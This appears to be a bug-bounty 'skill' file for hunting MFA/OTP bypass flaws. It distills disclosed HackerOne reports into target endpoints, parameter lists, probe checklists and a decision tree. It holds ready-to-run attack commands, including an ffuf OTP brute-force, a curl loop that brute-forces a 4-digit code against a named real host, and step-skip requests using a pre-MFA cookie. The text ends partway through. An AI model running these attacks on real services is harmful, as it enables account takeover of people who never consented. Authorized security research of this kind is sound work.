---
name: hunt-mfa
description: "Powerful hunting skill for MFA / 2FA / OTP bypass vulnerabilities, built from 126 assigned reports of which 96 full disclosed-report texts were mined. Covers the highest-frequency, highest-signal failure modes seen in real bounties: OTP/email-code brute force with no rate limit (Grab #202425, Bitwarden #979820, Algolia #128777, Evernote #1394984), client-side-only validation and response manipulation (DoD #2962527, H1 #1406471), workflow/step-skip via user_id or otp_user_id substitution (Snapchat #921780, GitLab #128085), 2FA linking/verify IDOR (Helium #810880), OTP/activation-code replay and non-expiring confirmation tokens (Shopify #695041, HackerOne #2529780, GSA #264090), MAID secret/backup-code changes without OTP (HackerOne #1139535, #587910), stale sessions after MFA activation (CS Money #1185479, Superhuman #667739), device-trust and remember-device escalation (Superhuman #665722), enrollment/verification bypass (Moneybird #649533, XVIDEOS #3016540, Omise #699200), OAuth/SSO alternate-path disabling of 2FA (Shopify #178293), deactivation+password-reset wiping 2FA (HackerOne #2463279, #2543342), business-logic requirement bypass on submission/invite/bounty-claim (HackerOne #418767, #2571981, #2575079, #2528919), CSRF on 2FA number add (Slack #155774), and race-condition/prefix-oracle shortcuts. Use when hunting auth bypass, MFA/OTP flows, or chaining primitives toward ATO. Gate: proof is an attacker session reaching post-MFA state, or a protected action/server secret obtained without a valid second factor."
sources: hackerone_public, cve_database, nist_800_63b, public_research, mined_full_reports
report_count: 126
full_reports_read: 96
---

## Crown Jewel Targets

MFA bypass is highest-value when it converts a password-only (or cookie-only) foothold into full account access. The disclosed corpus shows the juiciest targets are not "crack the TOTP" but "skip, replay, downgrade, or invoke the second factor on someone else's behalf." Prioritize, in order of observed payout and severity:

- **OTP / verification-code verify endpoints** — `/api/2fa/verify`, `/login/confirm`, `/users/sign_in` (`user[otp_attempt]`), `/scauth/otp/login`, password-reset 2FA steps. 55 of 96 full reports carry a `brute-otp-reset` signal. No rate limit + 4–6 digit code = deterministic ATO (Grab #202425 4-digit, Slack #121696 20 manual wrong codes, Bitwarden #979820 400-vs-200 oracle).
- **MFA settings / enrollment / disable endpoints** — `/settings/authentication/edit`, `/account/settings/2fa_sms`, `/settings/auth`, GraphQL mutations. This is where MAID and "password not checked" bugs live: disable 2FA with a correct backup code + garbage password (HackerOne #587910), rotate the secret key and backup codes without the OTP (HackerOne #1139535), brute-force the current password on the disable flow (Omise #1465277).
- **2FA-linking / backup-code endpoints that accept an identity parameter** — `/api/2fa` and `/api/2fa/verify` with a user ID (Helium #810880), `user_id` on logout/login (Snapchat #921780), `steamid` cookie on confirm (CS Money #1179232). Any client-supplied user identifier around the MFA state machine is a target.
- **Enrollment without email/phone verification** — register with the victim's email, never verify, then enable 2FA and lock them out (Moneybird #649533, XVIDEOS #3016540, Omise #699200, Cloudflare #1618021). Cheap to find, often pays, always a real impact story.
- **Alternate login paths that silently drop the 2FA requirement** — "Sign in with Google/Apple" (Shopify #178293, Cloudflare #1593404), embedded submission forms (HackerOne #418767 $10,000), transfer-report workflows (HackerOne #2569993), invite/collaborator flows (HackerOne #2575079, Omise #3356149). The second factor is enforced on the canonical path but not the side door.
- **Session lifecycle around MFA activation** — stale sessions surviving MFA enable (CS Money #1185479, Superhuman #667739), cookies surviving logout/password reset (HackerOne #2479622, #2469706, #1185479), "remember this device" trust not bound to IP/UA (Superhuman #665722 $2,500).
- **Business-logic MFA gates** — "2FA required to submit / claim bounty / accept invite." Bypassing the requirement via a different workflow path (HackerOne #2571981, #2528919, #2486086, #418767) is a recurring, high-upvote finding.
- **Code-generation internals / leaked secrets** — `gauth_secret` reflected in a response (Algolia #1276373), pre-generated 2FA secret + backup codes readable from the DOM (HackerOne #100509 $1,000), OTP returned in the response body (H1 CTF #2635315), "NIN/phone OTP bypass" (HackerOne #1314172).
- **Mobile / alternate clients** — Grab Android (`p.grabtaxi.com`), TikTok, Coinbase internal-transfer path (#10554 $1,000), CS Money `steamid`. Mobile APIs often have weaker rate limiting than the web app.
- **Admin/internal panels without a step-up gate** — `/admin/login` missing MFA (CFP Time #474963), account deletion with password only (Mozilla #2197244 $1,000), MFA requirement to send messages (Zivver #987650).

Payouts in the corpus range from $0 (many H1 self-reports) to $10,000 (HackerOne #418767), $3,250 (Eternal/Zomato #1330529), $2,500 (Superhuman #665722), $1,564 (TikTok #1247108), $1,500 (Shopify #178293), and $1,000 (Coinbase #10554, HackerOne #100509, Mozilla #2197244). Severity clusters High/Critical when the bypass is unauthenticated or yields ATO; Medium/Low when it needs an already-compromised session or password.

### Priority rubric — rank targets before spending time

Not every MFA flaw is worth a report. Score each candidate on four axes; spend time where the product is high.

| Axis | High-value signal | Low-value signal |
|------|-------------------|------------------|
| Preconditions | No password, no session, or only a pre-MFA cookie | Attacker already has full credentials and an authenticated session |
| Outcome | Full ATO, secret/backup-code theft, password change, lockout of victim | A boolean flips but nothing downstream changes |
| Scope | All users / any account via an ID parameter | Only the researcher's own account |
| Reliability | Deterministic, reproducible in 10 minutes | Race or timing dependent, flaky, or needs victim interaction |

Apply the rubric to the findings above:

- **Tier 1 (chase first):** cross-account login or 2FA binding via an identity parameter (#921780, #810880, #128085), deterministic OTP brute force with no rate limit (#202425, #979820, #128777), and a protected action reachable with a pre-MFA cookie. These are unauthenticated or password-only and yield full ATO.
- **Tier 2:** secret or backup-code exposure (#1276373, #100509), enrollment on an unverified identifier that locks out the owner (#649533, #3016540), and business-rule gate bypasses with a real payout (#418767, #2571981).
- **Tier 3:** replay of an already-consumed OTP or stale sessions — real bugs, but usually need an existing foothold; escalate by chaining with XSS/cookie theft rather than reporting standalone.
- **Tier 4 (often informational):** UX breakage that prevents 2FA setup (#2463069), wrong TOTP encoding or issuer (#260390, #251200), audit-log gaps (#1200989). Report only when they break a stated security guarantee or widen the acceptance window.
- **The chain multiplier:** a Tier-3 bug becomes Critical when paired with a password oracle or cookie theft. Before dismissing any finding, ask "what does this become if I already have the victim's session?"

---

## Attack Surface Signals

### Endpoints & parameters to enumerate
```
/api/2fa                 /api/2fa/verify          /login/confirm
/scauth/otp/login        /scauth/otp/droid/logout /users/sign_in (user[otp_attempt])
/account/settings/2fa_sms /settings/auth          /settings/authentication/edit
/settings/security       /security                /users/testqr (OTP verify)
/graphql  (2FA mutations) /api/me (backup codes)  /api/account/destroy
/password/reset           /forgot-password         /sign_up/enter_password
/otp/verify              /verify-otp              /api/verify-otp
/2fa/enable              /2fa/disable             /2fa/recovery
user_id=   user[id]=      otp_user_id=            otp_attempt=
otp=       code=          token=                  confirmation_token=
email=     phone=          mobile=                 backup_code=
gauth_secret=              session=                steamid= (cookie)
```

### Request/response signals
```
{"status":false} -> {"status":true} on intercepted response
HTTP 400 (invalid) vs 200 (valid) on OTP submit — a validation oracle
HTTP 204 No Content = OTP accepted (Grab #202425)
Response body contains gauth_secret / backup_codes / OTP value
Login response sets a "pre-MFA" session cookie but no MFA-satisfied flag
A "confirm 2FA code" request carrying a client-chosen user_id/steamid cookie
"2FA required" gate present on canonical route, absent on embedded/transfer/invite route
No 429 / no lockout after repeated wrong OTPs
An old OTP (multiple 30s windows) still accepted
```

### Tech / feature signals
- **TOTP authenticator apps** (Google Authenticator, Microsoft Authenticator) — test expired-code window (HackerOne #2588810: codes >1 minute old accepted) and replay across windows (#2529780).
- **SMS/email OTP with short codes** (4-digit Grab, 6-digit Evernote/Bitwarden) — prioritize brute force.
- **GraphQL 2FA mutations** — `mutation-polyglot`, `search-filter-sort`, `json-body` signals cluster here (HackerOne #587910, #1139535).
- **OAuth/SSO alternate sign-in** (`google_apps=1`, "Sign in with Apple") — check whether 2FA is disabled or bypassed.
- **Embedded submission forms / CTF-style alternate routes** — the canonical 2FA gate is often missing.
- **GraphQL/JSON APIs, mobile APIs, admin panels, deactivation flows** — all over-represented in the corpus.

### Recon artifacts worth grepping
```
grep -rEi "(otp|2fa|mfa|backup_code|recovery_code|gauth_secret|totp)" <source/js>
Look for: OTP compared client-side; status flag flipped in JS; user_id taken from request
Look for: code length constants (4, 6); no attempt counter; default/admin secrets in config
```

### High-value parameter dictionary

Treat any of these as an MFA trust-boundary parameter. Substitute your second account's value, a victim's value, an empty value, and a type-juggled value (array, object, `null`).

```
Identity carriers:   user_id, user[id], otp_user_id, uid, account_id, org_id,
                     organization, steamid, email, phone, mobile, msisdn
Code carriers:       otp, code, token, otp_attempt, user[otp_attempt],
                     confirmationCode, verification_code, backup_code,
                     recovery_code, sms_code, auth_code
State carriers:      status, success, verified, mfa_satisfied, two_factor,
                     remember_device, device_trust, pre_mfa, step
Secret carriers:     gauth_secret, totp_secret, secret_key, qr, seed
```

The corpus repeatedly shows the same mistake: a **state carrier** is read from the client instead of the server (#1406471 `status`, #2962527 response boolean), or an **identity carrier** is trusted to decide whose factor is being verified (#921780 `user_id`, #128085 `otp_user_id`, #1179232 `steamid`, #810880 user ID).

### Server / framework fingerprints

Infer where the second factor is likely enforced from the stack:

- **GraphQL endpoints (`/graphql`)** — MFA disable/secret rotation are mutations; test argument tampering and `json-body` bypass (HackerOne #587910, #1139535).
- **Ruby on Rails** (`user[otp_attempt]`, `session[:otp_user_id]`, multipart form) — state stored in session; test the `login` parameter and cross-account binding (GitLab #128085).
- **Node/Express JSON APIs** — `success`/`status` booleans are prime response-manipulation targets (DoD #2962527, UPchieve #1406471).
- **PHP/Laravel** (`remember_device` cookies) — device trust often not bound to IP/UA (Superhuman #665722).
- **Mobile backends** (`x-mts-ssid`, `x-auth-token`, custom headers) — weaker rate limits, short codes, and endpoint-only checks (Grab #202425, Helium #810880).
- **Legacy/self-hosted** (Nextcloud, GitLab, Rocket.Chat) — enforcement and session invalidation bugs cluster here (#1050244, #128085, #1701378, #1185479).

---

## Discovery Patterns From 96 Full Reports

This section distills how researchers actually found these bugs, not just how they exploited them. It is derived from the 96 full reports' technique-frequency table, the 40 highest-signal reports, and ~90 verbatim "how I found it" lines.

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **The login → OTP flow itself (highest yield).** What to look for: every state transition between "password accepted" and "MFA satisfied." Map the pre-MFA cookie, the OTP submit endpoint, and what resource becomes reachable at each step. `brute-otp-reset` appears in 55/96 reports — start here. (Snapchat #921780, GitLab #128085, Bitwarden #979820.)

2. **2FA settings / enrollment / disable pages.** What to look for: which fields demand the OTP or password, and which are actually validated server-side. Disable flows asking for "password + backup code" are classic MAID/bypass spots. (HackerOne #587910, #1139535, Omise #1465277, Zivver #992450.)

3. **Password-reset and email-verification flows.** What to look for: whether the 2FA challenge is enforced during reset, and whether the verification code has a rate limit. Many reports found 2FA removed after reset. (Slack #121696, Evernote #1394984, HackerOne #2463279, UPchieve #1406471, Nextcloud #486693.)

4. **Account deactivation / reactivation.** What to look for: does deactivation clear the 2FA flag, and can password reset on a deactivated account skip MFA? (HackerOne #2463279, #2543342.)

5. **Session/cookie lifecycle.** What to look for: sessions issued before MFA, sessions not invalidated after MFA enable/logout/password change, "remember device" cookies. (CS Money #1185479, HackerOne #2469706, #2479622, Superhuman #665722, Moneybird #743518.)

6. **Business-rule "2FA required" gates.** What to look for: the canonical path enforcing the rule and every alternate path (embedded forms, transfer, invite, claim-bounty, report submit) that skips it. (HackerOne #418767 $10,000, #2571981, #2575079, #2528919, #2486086, #2569993.)

7. **Alternate login providers (SSO/OAuth/social).** What to look for: whether sign-in via Google/Apple silently disables or bypasses 2FA. (Shopify #178293 $1,500, Cloudflare #1593404 $1,000, Nextcloud #722748.)

8. **Mobile / secondary API clients.** What to look for: weaker rate limits, 4-digit codes, endpoints not covered by the web app's controls. (Grab #202425, TikTok #1247108/#1747978, Coinbase #10554.)

9. **Registration with arbitrary email/phone.** What to look for: can you create an account with the victim's identifier without verifying it, then enable 2FA? (Moneybird #649533, XVIDEOS #3016540, Omise #699200, Cloudflare #1618021, HackerOne #2501984.)

10. **Response bodies and JS/DOM.** What to look for: reflected `gauth_secret`, backup codes, OTP values, or a client-side `status:false→true` check. (Algolia #1276373, HackerOne #100509, #2635315, DoD #2962527.)

11. **Admin / internal endpoints and destructive actions.** What to look for: `/admin/login`, account deletion, high-value transfers with password-only confirmation. (CFP Time #474963, Mozilla #2197244, Coinbase #10554/#16696.)

12. **Source-code defaults / misconfigurations.** What to look for: default or non-expiring secrets, wrong TOTP encoding, mis-set issuer, non-functional recovery codes, audit-log gaps. (Legal Robot #260390/#260491/#249337/#251200, Nextcloud #1200989.)

#### Recon surface → first request → expected tell

| Surface | First request to send | The "tell" that means keep going |
|---------|-----------------------|----------------------------------|
| Login → OTP | Wrong OTP on `/login/confirm` | Distinct 400/204 or a unique response length |
| Settings/disable | Wrong password + valid backup code on disable mutation | 2FA turns off anyway |
| Password reset | Reset flow with a 2FA-required account | No OTP prompt, code brute-forceable |
| Deactivation | Deactivate → reset password | 2FA flag cleared |
| Session lifecycle | Replay cookie after logout/MFA enable | Still authenticated |
| 2FA-required gate | Submit via embedded/transfer/invite route | Gate not enforced on the side path |
| SSO/OAuth | Sign in with Google/Apple after enabling 2FA | 2FA silently disabled or skipped |
| Mobile API | Repeated wrong 4-digit code on mobile endpoint | No 429, eventual 204 |
| Registration | Sign up with a victim email, then enable 2FA | No email proof required |
| Response/DOM | Read `/api/me` and settings HTML | `gauth_secret` / backup codes present |
| Admin/destructive | Hit `/admin/login` or account-delete with password only | No step-up prompt |
| Source defaults | Grep for secret constants and code-length checks | Static/expired-code acceptance |

Rule of thumb: the first request is always a **negative** one (wrong code, wrong password, victim ID, old cookie). A positive result on a negative input is the universal discovery signal across all 96 reports.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Ranked by number of full reports containing each signal (from the mined frequency table). "Why it matters" explains the security consequence; "what to probe" is the concrete next action.

| Rank | Signal (reports) | Why it matters | What to probe |
|------|------------------|----------------|---------------|
| 1 | brute-otp-reset (55) | No/weak rate limit turns a 4–6 digit code into deterministic ATO | Send 20+ wrong OTPs; check for 429/lockout; diff response length/status; try prefix-by-prefix validation |
| 2 | filter-bypass (43) | The control exists but can be skipped or flipped | Manipulate response false→true; substitute user_id/otp_user_id; hit the alternate workflow route |
| 3 | search-filter-sort (21) | Side channels and alternate resource paths leak or bypass the gate | Reorder/transfer/invite/claim workflows; compare canonical vs alternate response |
| 4 | api-endpoint (19) | MFA logic concentrated in JSON/REST endpoints trusting client params | Fuzz every ID/flag/token param on `/api/2fa*` for IDOR and missing checks |
| 5 | session-attack (19) | MFA state lives in session; stale/unbound sessions defeat it | Reuse pre-MFA and post-logout cookies; test session survival after MFA enable/password reset |
| 6 | cookie-handling (15) | Trust decisions keyed on client cookies (steamid, remember-device) | Swap cookie values across accounts/IPs/User-Agents; replay old cookies |
| 7 | server-side-rendering (12) | Password/OTP checks sometimes only enforced in the rendered UI | Call the underlying API/GraphQL directly with wrong password |
| 8 | dos-resource (12) | Rate-limit/lockout bugs double as account lockout or OTP flooding | Repeat confirm requests to lock victims; send OTP to attacker-controlled numbers |
| 9 | admin-internal (11) | Admin/self-service pages lack step-up MFA | Access `/admin/*`, account-deletion and settings endpoints with password-only session |
| 10 | auth-bypass (8) | Direct evidence the second factor can be nullified | Enumerate every route that leads to "logged in" without OTP |
| 11 | json-body (7) | 2FA verify/enable params in JSON are easy to tamper | Change `success`, `status`, `user_id`, `otp` in intercepted JSON |
| 12 | csrf (6) | 2FA number/backup-code changes missing CSRF token | Forge cross-site POST to `/2fa_sms`, `/settings` with no crumb |
| 13 | redirect-handling (6) | Open redirects or workflow redirects bypass the MFA page | Redirect away from `/mfa` to `/dashboard` after password step |
| 14 | public-code-search (4) | Leaked/known code patterns or reused OTPs discoverable | Search public writeups for default secrets; test known-code reuse |
| 15 | sso-oauth (3) | Social sign-in path disables or skips 2FA | Enable 2FA then sign in via Google/Apple and recheck 2FA state |
| 16 | debug-error-leak (3) | Errors reveal the OTP/session code | Submit wrong OTP and read the error body for the real code (H1 #142221) |
| 17 | time-based (3) | Expired codes still accepted / slow validation | Submit OTPs multiple 30s windows old; measure timing oracle |
| 18 | misconfiguration (2) | 2FA cannot be enabled or is silently off | Attempt normal 2FA setup; check QR generation and recovery codes |
| 19 | public-code-search (4) / subdomain (2) | Alternate hosts and public writeups reveal MFA entry points | Enumerate auth subdomains; search disclosed reports for default secrets |
| 20 | blind-oob (2) / time-based (3) | Timing side channels reveal valid codes or lockout state | Measure response time per guessed code; look for a slow/fast branch |
| 21 | graphql (2) / mutation-polyglot (2) | MFA state changes expressed as mutations accept mixed types | Send `user_id` as array/int/bool; test alias and fragment tricks |
| 22 | cache-layer (3) / import-feature (1) | Cached MFA responses or imported settings bypass the live check | Replay cached 2FA-satisfied responses; import a config with 2FA off |
| 23 | url-fetching (4) / redirect-handling (6) | Redirects after the password step skip the MFA route | Force `next=/dashboard` or a 302 away from `/mfa` |
| 24 | file-upload (1) / template-injection (2) | Uploaded/templated content can rewrite the MFA UI or leak codes | Inject into profile/template fields rendered near the OTP form |

**How to use the ranking:** signals 1–6 account for the overwhelming majority of findings. A target that shows both `brute-otp-reset` and `filter-bypass` signals is the highest-probability hunter's target — test the verify endpoint for brute force *and* the disable/settings endpoints for a control bypass before moving on. Lower-ranked signals are best treated as chains: a `debug-error-leak` that prints the OTP only matters if there is an endpoint that accepts it.

### Verbatim Discovery Clues (18 real `[#id]` quotes)

Verbatim "how I found it" lines from the full reports. These show the researcher's entry point; use them asmental templates for trust-boundary questions.

- [#587910] "when I was submitted a report to a program that request `2FA` ON, I notice that if you try to disable this option will ask for `backup code - password` and if you enter a random password in the request filed and a correct `backup code`..."
- [#810880] "I found 2 vulnerabilities in your 2FA implementation:"
- [#1276373] "So here i found that the \"gauth_secret\" is potentially leaked in response (which is not normal and is unnecesarry to leak), which means that the attacker who got access to the account can take advantage of this information leakage..."
- [#1050244] "I tried to understand why it's worked but I didn't found any reason for that"
- [#2571981] "I noticed that the organization enables the 2FA requirement so that only reporters who have set up 2FA can report, due to security reasons."
- [#2569993] "While testing the report submission function i found that when setting up the 2fa require to submit new reports to the program even the program staff can not able to submit report to the program but using transfer report method the reporter who doesn't setuped the 2fa has..."
- [#2529780] "However, I was still able to use the old OTP."
- [#2962527] "I discovered a vulnerability in the Two-Factor Authentication (2FA) mechanism of your website, stemming from an insecure design flaw."
- [#1394984] "when a user set ups his 2 Factor Authentication in his account and verify his email ,i was able to bruteforce the email verification process ."
- [#264090] "I found 2 ways to bypass this lock period."
- [#1406471] "I was able to bypass Email Verification code in account registration process."
- [#695041] "I noticed that when activating 2FA by sms, you can also use that 2FA activation code, to use as an authentication code when logging in."
- [#67660] "I found out that verification code sent as SMS while enabling Two-Step Authentication can be reused infinitely for login."
- [#418767] "Now i was able to bypass this 2FA setup requirements by using the Parrot Sec program __Embedded Submission Form__."
- [#667739] "@brdoors3 found a design issue in MFA implementation: previously created sessions aren't invalidated after MFA activation."
- [#2501984] "I was surprised to find that another person's number was now stored, and the recovery OTP was being sent to that individual's number, even though it had been modified by me."
- [#2588810] "During testing, I discovered that the TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication."
- [#66223] "I found myself be logged in with two accounts and there is no problem there, The exactly problem is you allow accounts that have the same number to be logged in with each other verification code if they request a login via SMS."

**Reading guide — turn each clue into a question you ask on a new target:**

- The "I noticed that if you try to disable..." clue (#587910) → *which confirmation fields are decorative rather than enforced?*
- The "found 2 vulnerabilities" clues (#810880, #264090) → *one bug usually means a second one in the same flow; keep digging after the first hit.*
- The `gauth_secret` leak (#1276373) and pre-generated codes (#100509) → *does any response or DOM expose the factor itself?*
- "I tried to understand why it's worked but I didn't found any reason" (#1050244) → *accept unexplained behavior; a state machine that "shouldn't" work is often the bug.*
- "set up 2FA can report" / "2fa require to submit" / "embedded submission form" (#2571981, #2569993, #418767) → *find every path to the same protected resource and compare the checks.*
- "still able to use the old OTP" / "reused infinitely" / "can be used again to log in" (#2529780, #67660, #695041) → *test code lifecycle, not just code correctness.*
- "bruteforce the email verification process" (#1394984) → *email/phone codes are MFA factors too; apply the same rate-limit lens.*
- "another person's number was now stored" (#2501984) → *can the factor's destination be changed without proving possession of the old one?*
- "accepts expired codes" (#2588810) → *measure the acceptance window, not only the current code.*

### Probe Checklist (15 concrete probes)

Run these against a single established session, in this order, before escalating to brute force.

1. **Wrong-code probe:** Submit `000000` / `123456`. A 200/204 or issued token means validation is broken or client-side.
2. **Response-flip probe:** Intercept the OTP response, change `{"success":false}` → `true` (or 401 → 200), forward — if the app proceeds, the check is client-side only (DoD #2962527, UPchieve #1406471).
3. **Step-skip probe:** With the pre-MFA session cookie, navigate directly to `/dashboard`, `/api/me`, `/account/profile` — protected data without MFA = Critical (hunt-mfa Pattern 4).
4. **OTP replay probe:** Complete a valid login, log out, log back in, submit the same OTP — accepted = no invalidation (HackerOne #2529780, Shopify #695041, WordPress #67660).
5. **Expired-code probe:** Wait 2–3 OTP windows (60–90s) and submit an old code — accepted = oversized acceptance window (HackerOne #2588810).
6. **Cross-window replay probe:** Generate three OTPs, use the first — accepted = codes not invalidated after generation (#2529780).
7. **User-ID substitution probe:** On logout/login/verify, swap `user_id` / `otp_user_id` / `login` to the victim's value (Snapchat #921780, GitLab #128085, Helium #810880).
8. **Cookie-swap probe:** Change `steamid`/session cookie on the confirm request to a victim's and submit wrong codes (CS Money #1179232).
9. **Rate-limit probe:** Send 20+ wrong OTPs; look for absence of 429, lockout, or notification (Slack #121696, Bitwarden #979820, Algolia #128777).
10. **Response-oracle probe:** Diff status/length/timing between wrong and correct codes (Grab 400 vs 204 #202425; Evernote length 373 #1394984).
11. **Prefix-oracle probe:** Submit `1`, then `12`, then `123` in the request body — a distinct response per prefix collapses 10^6 to ≤60 guesses; stay in ONE session.
12. **Disable-flow password probe:** With a valid backup code, send a garbage password on the 2FA-disable mutation (HackerOne #587910); brute the current password on the disable flow (Omise #1465277).
13. **Secret/backup-code exposure probe:** Read `/settings/authentication/edit`, `/api/me`, `/graphql` response for `gauth_secret` or `backup_codes` (Algolia #1276373, HackerOne #100509).
14. **Alternate-path probe:** Compare the 2FA gate on canonical vs embedded/transfer/invite/claim/OAuth paths (HackerOne #418767, #2569993, Shopify #178293).
15. **Stale-session probe:** Enable MFA on device A, reload device B; reset password then reuse the old cookie (CS Money #1185479, HackerOne #2469706).

#### Probe success criteria — what counts as a hit

| Probe | Confirmed when | Discard when |
|-------|----------------|--------------|
| Wrong-code | A token or protected data is issued on a wrong code | Only the same generic error on every input |
| Response-flip | The app proceeds downstream after the flip | The flip changes only the displayed message |
| Step-skip | Real user data returned with the pre-MFA cookie | Redirect back to `/mfa` every time |
| OTP replay | Old code accepted on a fresh login | Code already expired by policy (check window first) |
| Expired-code | Code older than the stated window accepted | The app regenerates codes on each request |
| Cross-window replay | First of three codes still valid | Each request invalidates prior codes |
| User-ID substitution | Logged in as / 2FA bound to the victim | Server ignores the supplied ID |
| Cookie-swap | Wrong codes for the victim trigger victim-side effects | Server derives identity from the session, not the cookie |
| Rate-limit | 20+ wrong codes with no 429/lockout/alert | A 429 appears — record the exact threshold |
| Response-oracle | A stable discriminator exists | Responses differ only by random request IDs |
| Prefix-oracle | A correct prefix gives a distinct response | All prefixes return the same text |
| Disable-flow password | 2FA disabled with a garbage password | Password is genuinely checked |
| Secret exposure | A live secret/backup code is present | Only a masked/hashed placeholder |
| Alternate-path | Protected action completes via the side route | The side route also enforces the gate |
| Stale-session | Old cookie still reaches an authenticated resource | Session invalidated as expected |

Record a **negative control** for every probe: the request that should fail and does. Without it, a "success" may just be the application's normal behavior.

---

## Step-by-Step Hunting Methodology

1. **Map the full MFA state machine in Burp.** Register two accounts you control. Walk enrollment, login-with-OTP, disable, backup-code regeneration, password reset, and logout. Label every request with the state it transitions from/to (password-only → pre-MFA → MFA-satisfied → authenticated). The bugs live in the gaps between states.

2. **Identify where the MFA "satisfied" flag is stored.** Cookie, session variable, JWT claim, or a server-side record. If it is a client-controlled value (`status`, `success`, `mfa_verified`, `steamid`, `user_id`), note it — that is a response-manipulation / IDOR candidate (H1 #1406471, CS Money #1179232).

3. **Check enforcement location.** Is MFA enforced by middleware on `/mfa` only, or on the resources behind it? Request `/dashboard`, `/api/me`, `/settings` with a pre-MFA cookie. If any return data, the gate is misplaced (Pattern 4 → Critical).

4. **Run the 15-probe checklist** from the Discovery section against a single session. Do the workflow/replay/response probes before any brute force — they are faster and higher-yield.

5. **Establish the validation oracle before brute forcing.** Compare a known-wrong and known-correct OTP: status code (400 vs 204/200), response length (Evernote's unique 373-byte response), timing, or headers. Without an oracle, brute force is blind.

6. **Measure the rate limit precisely.** Send 10, 20, then 50 wrong codes with lower concurrency. Record the exact attempt at which a 429/lockout appears — or confirm none appears. Many reports (Slack #121696, Bitwarden #979820, Algolia #128777, Grab #202425) succeeded purely because there was no limit. Use `-t 5` and per-request delays to avoid a ban; only attempt full 10^6 brute force when the key space is small (4-digit) and there is demonstrably no rate limit.

7. **Prefer the prefix oracle over full brute force.** If the validator compares digit-by-digit, walk the code one digit at a time (≤60 requests). Never re-login mid-sweep — re-authentication regenerates the OTP and discards prefix progress. Keep everything in one established MFA session.

8. **Test OTP lifecycle semantics.** Replay across logout/login, across 30-second windows, after password reset, after MFA re-enrollment, and after account deactivation. Non-expiring or reusable codes are a recurring High finding (HackerOne #2529780, Shopify #695041, GSA #264090, WordPress #67660).

9. **Test the race condition.** Fire ~30 concurrent submissions of the same OTP via HTTP/2 streams (Turbo Intruder) in one packet. Two requests resolve sequentially and give a false negative; 20+ parallel exposes the TOCTOU window where the server has not yet marked the code used (HackerOne #2598548 race-condition report). Confirmed if more than one submission succeeds.

10. **Test every identity-bearing parameter around MFA.** `user_id`, `otp_user_id`, `login`, `steamid`, organization ID, phone/email. Substitute your second account's or the victim's identifier. The corpus is full of IDOR-style MFA bugs (Helium #810880, Snapchat #921780, GitLab #128085, CS Money #1179232).

11. **Probe enrollment and verification for "skip verification" patterns.** Register with an unverified victim email, attempt to enable 2FA, attempt password reset, observe lockout (Moneybird #649533, XVIDEOS #3016540, Omise #699200). Add arbitrary phone numbers without SMS proof (HackerOne #2501984, #2588329, Superhuman #667740).

12. **Test alternate login and workflow routes.** Enable 2FA, then sign in via Google/Apple/SSO, embedded form, transfer-report flow, invite flow, or bounty-claim. Recheck whether 2FA is still required (Shopify #178293, Cloudflare #1593404, HackerOne #418767, #2569993, #2575079, #2528919).

13. **Test session invalidation boundaries.** Enable MFA on device A; check device B. Reset password; check old cookies. Logout; replay the cookie. "Remember this device" cookie from a new IP/UA (CS Money #1185479, HackerOne #2469706, Superhuman #665722, #667739).

14. **Inspect what MFA-protected secrets are exposed.** Read `/api/me`, `/graphql`, `/settings/authentication/edit` response bodies and JS/DOM for backup codes, `gauth_secret`, or OTP values (HackerOne #100509, Algolia #1276373). An info-disclosure that leaks the second factor is itself a bypass.

15. **Document the chain and quantify impact.** Show the exact attacker capability: full ATO (High/Critical), persistence via password change, lockout of the victim, or disclosure of protected data. Capture each request/response. Then run Gate 0 before writing the report.

### Decision tree — pick the technique from the first response

```
Does a wrong OTP ever yield a token / protected data?
├─ YES -> client-side or validation-broken. Flip the response boolean, then
│         confirm the downstream state change. (DoD #2962527, UPchieve #1406471)
└─ NO
   ├─ Do 20 wrong codes return an identical, rate-limited error?
   │  ├─ NO  -> brute force if an oracle exists; try prefix oracle first.
   │  │         (Grab #202425, Bitwarden #979820, Algolia #128777)
   │  └─ YES -> look for a workflow bypass instead.
   ├─ Can you reach /dashboard or /api/me with the pre-MFA cookie?
   │  └─ YES -> step-skip: Critical. (Pattern 4, #921780, #128085)
   ├─ Can you change user_id / otp_user_id / steamid in the flow?
   │  └─ YES -> cross-account binding/login: Critical. (#810880, #1179232)
   ├─ Does the disable/secret-rotation flow skip the password or OTP?
   │  └─ YES -> MAID / missing-check bypass. (#587910, #1139535)
   ├─ Does an old code or old cookie still work?
   │  └─ YES -> replay/stale-session; escalate with XSS or cookie theft.
   ├─ Is there a parallel route to the same protected action?
   │  └─ YES -> business-logic gate bypass. (#418767, #2571981)
   └─ Do responses/DOM contain gauth_secret or backup codes?
      └─ YES -> info-disclosure -> bypass. (#1276373, #100509)
```

### Pacing and noise control

- Stay in **one session** for prefix sweeps and replay tests; re-login regenerates the OTP and destroys progress.
- Use `-t 5` and 0.5–2s jitter for brute force; aggressive rates produce 429s and IP bans that contaminate later tests.
- Capture every request in Burp's `Logger` so you can reconstruct exactly which negative input produced which positive result.
- For race tests, repeat 3–5 bursts and record a success ratio; a single success out of 30 is evidence, not a flake, if it repeats.
- Never test brute force or races against accounts you do not own. All cited examples used the researcher's own accounts or authorized test programs.

---

## Payload & Detection Patterns

### Brute force with ffuf (6-digit OTP, no rate limit)
```bash
# Slow concurrency to avoid a ban; mark the success discriminator with -fc/-fs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_PRE_MFA_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5

# 4-digit code (Grab #202425) — only 1000–9999
seq -w 1000 9999 | while read c; do
  curl -s -o /dev/null -w "%{http_code} $c\n" -X PUT \
    -H "x-mts-ssid: SESSION" \
    -d "otp=$c" https://p.grabtaxi.com/api/passenger/v2/profiles/edit
done
```

### Response-manipulation / client-side-only check
```http
# Enter wrong OTP, intercept the RESPONSE, flip the boolean:
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false}   -->   {"success":true}
# or 401 Unauthorized --> 200 OK
# If the application proceeds to the dashboard, MFA is client-side only.
# H1 #1406471: {"status":false -> "status":true}
```

### Workflow / step-skip
```bash
# After password step the app sets a pre-MFA cookie and redirects to /mfa
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
curl -s -b "session=PRE_MFA_SESSION" https://target.com/api/me

# Direct API/GraphQL call bypassing the rendered UI check
